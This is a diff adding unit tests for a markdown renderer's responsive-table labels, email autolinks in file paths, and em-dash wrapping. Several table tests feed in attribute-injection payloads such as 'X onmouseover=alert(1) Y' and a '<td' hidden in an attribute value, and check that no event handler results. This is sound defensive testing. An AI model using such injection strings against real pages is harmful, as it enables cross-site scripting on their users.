+    expect(html).not.toContain('&amp;amp;');
+  });
+
+  /** The label is stamped ONTO the cell, so whoever decides where the cell
+   *  starts and ends decides whether the label lands in attribute-name
+   *  position. The serializer leaves `<` and `>` raw inside an attribute value,
+   *  so a regex cannot make that call. Both shapes below turned a header cell
+   *  into an event handler on the host document.
+   *
+   *  Read off the PARSED result rather than the string, because the string is
+   *  exactly what looked fine. */
+  const HEADER_PAYLOAD = 'X onmouseover=alert(1) Y';
+  const handlerCarriers = (html: string) =>
+    [...new DOMParser().parseFromString(html, 'text/html').querySelectorAll('*')]
+      .filter((el) => el.getAttributeNames().some((name) => name.startsWith('on')))
+      .map((el) => el.tagName);
+
+  it('keeps a header out of attribute position when a cell attribute carries a >', () => {
+    const html = renderMarkdown(
+      `<table><tr><th>${HEADER_PAYLOAD}</th><th>B</th><th>C</th><th>D</th></tr>`
+      + '<tr><td title="a>b">w</td><td>x</td><td>y</td><td>z</td></tr></table>',
+    );
+    expect(handlerCarriers(html)).toEqual([]);
+    const cell = new DOMParser().parseFromString(html, 'text/html').querySelector('td');
+    expect(cell!.getAttributeNames()).toEqual(['title', 'data-label']);
+    expect(cell!.getAttribute('title')).toBe('a>b');
+    expect(cell!.getAttribute('data-label')).toBe(HEADER_PAYLOAD);
+    expect(cell!.textContent).toBe('w');
+  });
+
+  /** The second shape, which a quote-aware regex does not close either: the
+   *  three characters `<td` sitting inside another element's attribute value.
+   *  A `<th>` may share a row with a `<td>`, which is what gave the false start
+   *  a closing tag to pair with. */
+  it('stamps no cell for a <td written inside an attribute value', () => {
+    const html = renderMarkdown(
+      `<table><tr><th><span title="<td a=1>">${HEADER_PAYLOAD}</span></th>`
+      + '<th>B</th><th>C</th><th>D</th><td>q</td></tr>'
+      + '<tr><td>w</td><td>x</td><td>y</td><td>z</td></tr></table>',
+    );
+    expect(handlerCarriers(html)).toEqual([]);
+    const doc = new DOMParser().parseFromString(html, 'text/html');
+    // The text stays text, and the real cells are still labelled: the header
+    // row's lone `<td>` takes the first label, then the body row takes four.
+    expect(doc.querySelector('span')!.getAttribute('title')).toBe('<td a=1>');
+    expect(labels(html)).toEqual([HEADER_PAYLOAD, HEADER_PAYLOAD, 'B', 'C', 'D']);
+  });
+
+  /** The serializer writes `<` and `>` raw inside a value, and `linkifyPaths`
+   *  re-scans this output. Its `splitTags` must keep a `>` in the label from
+   *  ending the tag, or a spliced link puts the rest in attribute-name
+   *  position. */
+  it("a header's angle brackets stay in the label and never become a handler", () => {
+    const html = renderMarkdown(
+      mdTable(['q>https://e.com/onmouseover=x;//', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']),
+      { cache: false },
+    );
+    expect(labels(html)).toEqual(['q>https://e.com/onmouseover=x;//', 'B', 'C', 'D']);
+    const linked = linkifyPaths(html, [], []);
+    const doc = new DOMParser().parseFromString(linked, 'text/html');
+    const handlers = [...doc.querySelectorAll('*')]
+      .filter((el) => el.getAttributeNames().some((name) => name.startsWith('on')));
+    expect(handlers).toEqual([]);
+  });
+
+  /** A nested table is its own table. Counting its headers toward the outer
+   *  column count stacked a two-column grid. Stamping the outer labels onto
+   *  the inner cells labelled them with the wrong column. The CSS rule reaches
+   *  every descendant cell, so both showed on a phone. */
+  it('counts and labels a nested table apart from the one holding it', () => {
+    const html = renderMarkdown(
+      '<table><tr><th>A</th><th>B</th></tr>'
+      + '<tr><td><table><tr><th>N1</th><th>N2</th><th>N3</th><th>N4</th></tr>'
+      + '<tr><td>1</td><td>2</td><td>3</td><td>4</td></tr></table></td>'
+      + '<td>q</td></tr></table>',
+      { cache: false },
+    );
+    const doc = new DOMParser().parseFromString(html, 'text/html');
+    const [outer, inner] = Array.from(doc.querySelectorAll('table'));
+    // Two columns, so the outer keeps the grid and stamps nothing.
+    expect(outer.hasAttribute('data-stack')).toBe(false);
+    expect(Array.from(outer.rows[1].cells, (c) => c.hasAttribute('data-label')))
+      .toEqual([false, false]);
+    // Four, so the inner stacks and carries its OWN headers.
+    expect(inner.hasAttribute('data-stack')).toBe(true);
+    expect(Array.from(inner.rows[1].cells, (c) => c.getAttribute('data-label')))
+      .toEqual(['N1', 'N2', 'N3', 'N4']);
+  });
+
+  it('reduces a header carrying markup to its plain text', () => {
+    const html = renderMarkdown(mdTable(['`code`', '**bold**', '[l](https://e.com)', 'D'], ['w', 'x', 'y', 'z']));
+    expect(labels(html)).toEqual(['code', 'bold', 'l', 'D']);
+    for (const label of labels(html)) expect(label).not.toContain('<');
+  });
+
+  it('drops an inline HTML tag in a header rather than labelling with it', () => {
+    const html = renderMarkdown(mdTable(['<img src=x>', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']));
+    expect(labels(html)).toEqual(['', 'B', 'C', 'D']);
+  });
+
+  it('labels the padded cells of a short row, which stay empty for the CSS to hide', () => {
+    // marked pads a short row out to the header's column count.
+    const md = ['| A | B | C | D |', '| --- | --- | --- | --- |', '| w | x |'].join('\n');
+    const html = renderMarkdown(md);
+    expect(labels(html)).toEqual(['A', 'B', 'C', 'D']);
+    expect(html).toContain('<td data-label="C"></td>');
+  });
+
+  // The post-sanitizer passes share one module-level inert body, so markup one
+  // render left in it would reach the next. `inDom` empties it in a `finally`;
+  // this is what notices if that stops happening.
+  it('is stable across repeated renders of the same table', () => {
+    const md = mdTable(['A', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']);
+    const first = renderMarkdown(md, { cache: false });
+    const second = renderMarkdown(md, { cache: false });
+    expect(second).toBe(first);
+    expect(labels(second)).toEqual(['A', 'B', 'C', 'D']);
+  });
+
+  // The same body serves images and tables, so a render of one must not leave
+  // anything for the other. Interleaved deliberately: a leak shows up as the
+  // previous document's markup prefixed onto this one.
+  it('leaves nothing behind for the next render', () => {
+    const table = mdTable(['A', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']);
+    const image = '![a](artifacts/one.png)';
+    const plain = 'just prose';
+    const first = renderMarkdown(table, { cache: false });
+    renderMarkdown(image, { cache: false });
+    expect(renderMarkdown(plain, { cache: false })).toBe('<p>just prose</p>\n');
+    expect(renderMarkdown(table, { cache: false })).toBe(first);
+  });
+
+  it('transforms every table in a document independently', () => {
+    const wide = mdTable(['A', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']);
+    const narrow = mdTable(['E', 'F'], ['1', '2']);
+    const html = renderMarkdown(`${wide}\n\n${narrow}`);
+    expect(html.match(/<div class="table-scroll-wrapper">/g)).toHaveLength(2);
+    expect(html.match(/<table data-stack="">/g)).toHaveLength(1);
+    expect(labels(html)).toEqual(['A', 'B', 'C', 'D']);
+  });
+});
+
+// marked's GFM autolinker reads any `local@domain.tld` run as an email, even
+// inside a path. A home directory like `/Users/me.x@example.com/` then renders
+// a `mailto:` link in the middle of the path, and a click opens Mail.
+describe('renderMarkdown email autolinks inside a path', () => {
+  it('leaves an email-shaped path segment as plain text', () => {
+    const html = renderMarkdown('DMG: file:///Users/me.x@example.com/p/Lucidos.dmg', { cache: false });
+    expect(html).not.toContain('mailto:');
+    expect(html).toContain('file:///Users/me.x@example.com/p/Lucidos.dmg');
+  });
+
+  it('leaves an absolute path with an email-shaped segment as plain text', () => {
+    const html = renderMarkdown('open "/Users/me.x@example.com/p/Lucidos.dmg"', { cache: false });
+    expect(html).not.toContain('mailto:');
+  });
+
+  it('keeps an authored email link after a slash', () => {
+    for (const md of ['/[me.x@example.com](mailto:me.x@example.com)', '/<me.x@example.com>']) {
+      expect(renderMarkdown(md, { cache: false })).toContain('<a href="mailto:me.x@example.com">');
+    }
+  });
+
+  it('leaves no autolink marker in the output', () => {
+    expect(renderMarkdown('Write to me.x@example.com today', { cache: false })).not.toContain('data-');
+  });
+
+  it('still autolinks an email in prose', () => {
+    const html = renderMarkdown('Write to me.x@example.com today', { cache: false });
+    expect(html).toContain('<a href="mailto:me.x@example.com">me.x@example.com</a>');
+  });
+});
+
+describe('renderMarkdown unspaced em dashes', () => {
+  const EM = String.fromCharCode(0x2014);
+  const gaps = (html: string): number => (html.match(/class="em-dash-gap"/g) ?? []).length;
+  const text = (html: string): string => {
+    const div = document.createElement('div');
+    div.innerHTML = html;
+    return div.textContent ?? '';
+  };
+
+  it('wraps an unspaced em dash so it cannot read as a hyphen', () => {
+    const html = renderMarkdown(`couldn't start${EM}another thread`, { cache: false });
+    expect(html).toContain(`start<span class="em-dash-gap">${EM}</span>another`);
+  });
+
+  it('wraps a one-sided em dash', () => {
+    expect(gaps(renderMarkdown(`left ${EM}right`, { cache: false }))).toBe(1);
+    expect(gaps(renderMarkdown(`left${EM} right`, { cache: false }))).toBe(1);
+  });
+
+  it('leaves a spaced em dash alone', () => {
+    const html = renderMarkdown(`start ${EM} another\n\n${EM} opens a line`, { cache: false });
+    expect(gaps(html)).toBe(0);
+  });
+
+  it('treats a line break as a space', () => {
+    expect(gaps(renderMarkdown(`first line\n${EM} second line`, { cache: false }))).toBe(0);
+  });
+
+  it('reads the neighbour across inline markup', () => {
+    expect(gaps(renderMarkdown(`**bold**${EM} next`, { cache: false }))).toBe(1);
+    expect(gaps(renderMarkdown(`word**${EM}** next`, { cache: false }))).toBe(1);
+    expect(gaps(renderMarkdown(`word **${EM}** next`, { cache: false }))).toBe(0);
+  });
+
+  it('leaves SVG and text-only elements alone, where a span would not survive', () => {
+    const svg = `<svg width="10"><text x="1">A${EM}B</text></svg>`;
+    expect(gaps(renderMarkdown(svg, { cache: false }))).toBe(0);
+    expect(gaps(renderMarkdown(`<textarea>a${EM}b</textarea>`, { cache: false }))).toBe(0);
+  });
+
+  it('never touches code', () => {
+    const html = renderMarkdown(`\`a${EM}b\`\n\n\`\`\`\nx${EM}y\n\`\`\``, { cache: false });
+    expect(gaps(html)).toBe(0);
+  });
+
+  it('keeps the text exactly as written', () => {
+    const md = `one${EM}two, three ${EM} four, five${EM}six`;
+    const html = renderMarkdown(md, { cache: false });
+    expect(gaps(html)).toBe(2);
+    expect(text(html).trim()).toBe(md);
+  });
+});
